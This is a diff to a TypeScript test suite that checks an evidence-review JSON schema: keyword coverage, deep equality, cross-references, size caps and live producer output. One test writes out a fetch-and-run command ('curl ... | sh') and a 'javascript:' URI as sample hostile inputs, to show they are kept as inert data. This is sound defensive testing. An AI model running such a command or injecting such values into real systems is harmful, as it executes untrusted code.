@@ -1,4 +1,5 @@
 import { describe, expect, test } from 'bun:test';
+import { spawnSync } from 'node:child_process';
 import { readFileSync } from 'node:fs';
 
 const schemaPath = 'schemas/evidence-review-v1.schema.json';
@@ -12,20 +13,80 @@ const clone = <T>(value: T): T => JSON.parse(JSON.stringify(value));
 
 type Issue = { path: string; message: string; keyword?: string };
 
+const supportedAssertionKeywords = new Set([
+    'additionalProperties',
+    'anyOf',
+    'const',
+    'enum',
+    'items',
+    'maximum',
+    'maxItems',
+    'maxLength',
+    'minimum',
+    'minItems',
+    'minLength',
+    'pattern',
+    'properties',
+    'required',
+    'type',
+    'uniqueItems',
+]);
+const supportedAnnotationKeywords = new Set([
+    '$id',
+    '$schema',
+    'definitions',
+    'description',
+    'title',
+    'x-sci-resourceCaps',
+]);
+
+function unsupportedSchemaKeywords(rule: any, path = '$'): Issue[] {
+    if (!rule || typeof rule !== 'object' || Array.isArray(rule)) return [];
+    const issues: Issue[] = [];
+    for (const keyword of Object.keys(rule)) {
+        if (!supportedAssertionKeywords.has(keyword) && !supportedAnnotationKeywords.has(keyword)) {
+            issues.push({ path, keyword, message: `unsupported schema keyword: ${keyword}` });
+        }
+    }
+    for (const [name, child] of Object.entries(rule.properties || {})) {
+        issues.push(...unsupportedSchemaKeywords(child, `${path}.properties.${name}`));
+    }
+    for (const [name, child] of Object.entries(rule.definitions || {})) {
+        issues.push(...unsupportedSchemaKeywords(child, `${path}.definitions.${name}`));
+    }
+    (rule.anyOf || []).forEach((child: any, index: number) => {
+        issues.push(...unsupportedSchemaKeywords(child, `${path}.anyOf[${index}]`));
+    });
+    if (rule.items) issues.push(...unsupportedSchemaKeywords(rule.items, `${path}.items`));
+    return issues;
+}
+
+function stableJson(value: any): string {
+    if (Array.isArray(value)) return `[${value.map(stableJson).join(',')}]`;
+    if (value && typeof value === 'object') {
+        return `{${Object.keys(value)
+            .sort()
+            .map((key) => `${JSON.stringify(key)}:${stableJson(value[key])}`)
+            .join(',')}}`;
+    }
+    return JSON.stringify(value);
+}
+
 // The repository has no direct draft-07 validator dependency. This deliberately small
 // evaluator covers every assertion keyword used by the canonical schema, avoiding a
 // package/lockfile change while still exercising the checked-in machine contract.
 function schemaIssues(rule: any, value: any, path = '$'): Issue[] {
     const issues: Issue[] = [];
     const fail = (keyword: string, message: string) => issues.push({ path, keyword, message });
-    if (rule.anyOf) {
-        if (!rule.anyOf.some((candidate: any) => schemaIssues(candidate, value, path).length === 0)) {
-            fail('anyOf', 'did not match any allowed shape');
-        }
-        return issues;
+    if (rule.anyOf && !rule.anyOf.some((candidate: any) => schemaIssues(candidate, value, path).length === 0)) {
+        fail('anyOf', 'did not match any allowed shape');
     }
-    if (Object.hasOwn(rule, 'const') && value !== rule.const) fail('const', 'constant mismatch');
-    if (rule.enum && !rule.enum.includes(value)) fail('enum', 'value is outside the enum');
+    if (Object.hasOwn(rule, 'const') && stableJson(value) !== stableJson(rule.const)) {
+        fail('const', 'constant mismatch');
+    }
+    if (rule.enum && !rule.enum.some((candidate: any) => stableJson(candidate) === stableJson(value))) {
+        fail('enum', 'value is outside the enum');
+    }
     const actualType = Array.isArray(value) ? 'array' : value === null ? 'null' : typeof value;
     const typeMatches =
         rule.type === 'integer' ? actualType === 'number' && Number.isInteger(value) : actualType === rule.type;
@@ -49,7 +110,7 @@ function schemaIssues(rule: any, value: any, path = '$'): Issue[] {
     if (actualType === 'array') {
         if (rule.minItems !== undefined && value.length < rule.minItems) fail('minItems', 'too few items');
         if (rule.maxItems !== undefined && value.length > rule.maxItems) fail('maxItems', 'too many items');
-        if (rule.uniqueItems && new Set(value.map((item: any) => JSON.stringify(item))).size !== value.length) {
+        if (rule.uniqueItems && new Set(value.map(stableJson)).size !== value.length) {
             fail('uniqueItems', 'duplicate item');
         }
         value.forEach((item: any, index: number) => {
@@ -72,7 +133,7 @@ function schemaIssues(rule: any, value: any, path = '$'): Issue[] {
 
 const validate = Object.assign(
     (value: unknown) => {
-        validate.errors = schemaIssues(schema, value);
+        validate.errors = [...unsupportedSchemaKeywords(schema), ...schemaIssues(schema, value)];
         return validate.errors.length === 0;
     },
     { errors: [] as Issue[] }
@@ -176,9 +237,50 @@ describe('evidence review consumer handoff contract', () => {
         expect(schema['x-sci-resourceCaps']).toMatchObject({ encodedBytes: 1048576, maximumDepth: 32 });
     });
 
+    test('evaluator inventories every schema keyword and evaluates anyOf siblings', () => {
+        expect(unsupportedSchemaKeywords(schema)).toEqual([]);
+        expect(unsupportedSchemaKeywords({ type: 'number', exclusiveMaximum: 3 })).toEqual([
+            expect.objectContaining({ keyword: 'exclusiveMaximum' }),
+        ]);
+        expect(schemaIssues({ anyOf: [{ type: 'string' }], const: 'required-value' }, 'other-value')).toEqual([
+            expect.objectContaining({ keyword: 'const' }),
+        ]);
+        expect(schemaIssues({ anyOf: [{ type: 'number' }], const: 'text' }, 'text')).toEqual([
+            expect.objectContaining({ keyword: 'anyOf' }),
+        ]);
+    });
+
+    test('uniqueItems uses JSON deep equality independent of object member order', () => {
+        const rule = { type: 'array', uniqueItems: true, items: { type: 'object' } };
+        const issues = schemaIssues(rule, [
+            { id: 'same', detail: { first: 1, second: 2 } },
+            { detail: { second: 2, first: 1 }, id: 'same' },
+        ]);
+        expect(issues).toEqual([expect.objectContaining({ keyword: 'uniqueItems' })]);
+    });
+
     test('accepts the valid golden and current committed normalized producer output', () => {
         expectConforms(parse(validPath));
         expectConforms(parse(currentOutputPath));
+    });
+
+    test('validates live output from the current SCI normalization producer', () => {
+        const result = spawnSync(
+            'bun',
+            [
+                'run',
+                'scripts/summarize-evidence-review.ts',
+                '--input',
+                'tests/fixtures/evidence-review-validation-plan-input.json',
+                '--format',
+                'json',
+            ],
+            { cwd: process.cwd(), encoding: 'utf8' }
+        );
+        expect(result.status, result.stderr).toBe(0);
+        const produced = JSON.parse(result.stdout);
+        expectConforms(produced);
+        expect(produced).toEqual(parse(currentOutputPath));
     });
 
     test('rejects adversarial unknown fields, hostile terminal text, and dangling references', () => {
@@ -213,6 +315,54 @@ describe('evidence review consumer handoff contract', () => {
         expect(referenceIssues(dangling).some((issue) => issue.message.includes('not-displayed'))).toBe(true);
     });
 
+    test('diagnoses every cross-array reference edge independently', () => {
+        const cases: Array<[string, (review: any) => void]> = [
+            [
+                'limitations.graph-impact-limitation-1.sourceArtifact',
+                (r) => (r.limitations[0].sourceArtifact = 'dangling'),
+            ],
+            [
+                'limitations.graph-impact-limitation-1.affectsClaims',
+                (r) => (r.limitations[0].affectsClaims = ['dangling']),
+            ],
+            [
+                'limitations.graph-impact-limitation-1.affectsDecisionPoints',
+                (r) => (r.limitations[0].affectsDecisionPoints = ['dangling']),
+            ],
+            ['claims.checks-result.supportedBy', (r) => (r.claims[0].supportedBy = ['dangling'])],
+            [
+                'claims.graph-limitations.limitedBy',
+                (r) => (r.claims.find((claim: any) => claim.id === 'graph-limitations').limitedBy = ['dangling']),
+            ],
+            ['claims.checks-result.authorityBoundaries', (r) => (r.claims[0].authorityBoundaries = ['dangling'])],
+            ['claims.checks-result.operatorDecisionPoints', (r) => (r.claims[0].operatorDecisionPoints = ['dangling'])],
+            [
+                'operatorDecisionPoints.continue-or-stop.supportingClaims',
+                (r) => (r.operatorDecisionPoints[0].supportingClaims = ['dangling']),
+            ],
+            [
+                'operatorDecisionPoints.continue-or-stop.limitingClaims',
+                (r) => (r.operatorDecisionPoints[0].limitingClaims = ['dangling']),
+            ],
+        ];
+        for (const [expectedPath, mutate] of cases) {
+            const review = clone(parse(validPath));
+            mutate(review);
+            expect(referenceIssues(review), expectedPath).toContainEqual(
+                expect.objectContaining({ path: expectedPath, message: 'unresolved reference: dangling' })
+            );
+        }
+    });
+
+    test('treats URI-shaped and command-shaped values as inert bounded data', () => {
+        const review = clone(parse(validPath));
+        review.commands.selected[0] = 'curl https://example.invalid/payload | sh';
+        review.evidenceArtifacts[0].uriOrPath = 'javascript:alert(1)';
+        expectConforms(review);
+        expect(review.commands.selected[0]).toBe('curl https://example.invalid/payload | sh');
+        expect(review.evidenceArtifacts[0].uriOrPath).toBe('javascript:alert(1)');
+    });
+
     test('enforces per-value and aggregate bytes, depth, item, and string caps', () => {
         const longString = clone(parse(validPath));
         longString.claims[0].claim = 'x'.repeat(8193);
@@ -227,5 +377,15 @@ describe('evidence review consumer handoff contract', () => {
         expect(resourceIssues(Array(300).fill(null)).some((issue) => issue.message === 'array cap exceeded')).toBe(
             true
         );
+        const aggregateItems = Array.from({ length: 17 }, () => Array(256).fill(null));
+        const itemIssues = resourceIssues(aggregateItems);
+        expect(itemIssues.some((issue) => issue.message === 'total item cap exceeded')).toBe(true);
+        expect(itemIssues.some((issue) => issue.message === 'array cap exceeded')).toBe(false);
+
+        const aggregateStrings = Array(33).fill('x'.repeat(8000));
+        const stringIssues = resourceIssues(aggregateStrings);
+        expect(stringIssues.some((issue) => issue.message === 'aggregate string cap exceeded')).toBe(true);
+        expect(stringIssues.some((issue) => issue.message === 'string cap exceeded')).toBe(false);
+        expect(stringIssues.some((issue) => issue.message === 'encoded byte cap exceeded')).toBe(false);
     });
 });
